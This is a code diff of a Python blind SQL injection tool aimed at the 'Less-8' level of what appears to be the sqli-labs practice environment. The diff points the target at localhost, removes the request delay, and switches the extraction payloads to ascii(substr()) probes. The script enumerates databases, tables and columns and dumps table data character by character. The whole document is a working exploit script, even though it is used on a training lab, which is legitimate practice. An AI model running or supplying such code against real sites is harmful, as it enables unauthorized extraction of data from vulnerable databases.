@@ -3,10 +3,10 @@ from time import sleep
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://c56d00ef-d983-4071-b3b1-31b9e91b5207.node4.buuoj.cn:81/Less-8/?id=1'
+baseurl = 'http://127.0.0.1:81/Less-8/?id=1'
 # less5:'  less6:"  less7:'))  less8:'
 poc = '\''
-delayBetweenRequests = 1
+delayBetweenRequests = 0
 
 
 def get(url, header=standardHeader):
@@ -40,14 +40,14 @@ def forceDatabases(pocUrl, okText):
         if not checkRes(res.text, okText):
             print("Database length is {}\nForcing each char".format(databaseConcatLength))
             allDatabases = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
             for index in range(1,databaseConcatLength+1):
                 for char in sqlForce:
-                    nowDatabases = allDatabases + char
-                    expUrl = pocUrl + payload.format(str(index), nowDatabases)
+                    expUrl = pocUrl + payload.format(str(index), ord(char))
                     res = get(expUrl)
+                    # print(expUrl)
                     if checkRes(res.text, okText):
-                        allDatabases = nowDatabases
+                        allDatabases = allDatabases + char
                         print(allDatabases)
                         break
             return allDatabases
@@ -63,14 +63,14 @@ def forceTables(pocUrl, database, okText):
         if not checkRes(res.text, okText):
             print("table length is {}\nForcing each char".format(tableConcatLength))
             allTables = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
-            for index in range(1, tableConcatLength+1):
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
+            for index in range(1,tableConcatLength+1):
                 for char in sqlForce:
-                    nowTables = allTables + char
-                    expUrl = pocUrl + payload.format(str(index), nowTables)
+                    expUrl = pocUrl + payload.format(str(index), ord(char))
                     res = get(expUrl)
+                    # print(expUrl)
                     if checkRes(res.text, okText):
-                        allTables = nowTables
+                        allTables = allTables + char
                         print(allTables)
                         break
             return allTables
@@ -85,37 +85,37 @@ def forceColumns(pocUrl, table, okText):
         if not checkRes(res.text, okText):
             print("columns length is {}\nForcing each char".format(columnConcatLength))
             allColumns = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
-            for index in range(1, columnConcatLength+1):
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
+            for index in range(1, columnConcatLength + 1):
                 for char in sqlForce:
-                    nowColumns = allColumns + char
-                    expUrl = pocUrl + payload.format(str(index), nowColumns)
+                    expUrl = pocUrl + payload.format(str(index), ord(char))
                     res = get(expUrl)
+                    # print(expUrl)
                     if checkRes(res.text, okText):
-                        allColumns = nowColumns
+                        allColumns = allColumns + char
                         print(allColumns)
                         break
             return allColumns
 
 
-def dumpData(pocUrl, okText, database, table, column='*'):
-    payload = "(select {} from {}.{})".format(column, database, table)
+def dumpData(pocUrl, okText, database, table, column):
+    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
     print("Forcing all data's length")
     for dataConcatLength in range(1, 9999):
         expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))
         res = get(expUrl)
+        # print(expUrl)
         if not checkRes(res.text, okText):
             print("data length is {}\nForcing each char".format(dataConcatLength))
             allData = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
-            for index in range(1, dataConcatLength+1):
+            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
+            for index in range(1,dataConcatLength+1):
                 for char in sqlForce:
-                    nowData = allData + char
-                    expUrl = pocUrl + payload.format(str(index), nowData)
-                    # print(expUrl)
+                    expUrl = pocUrl + payload.format(str(index), ord(char))
                     res = get(expUrl)
+                    # print(expUrl)
                     if checkRes(res.text, okText):
-                        allData = nowData
+                        allData = allData + char
                         print(allData)
                         break
             return allData
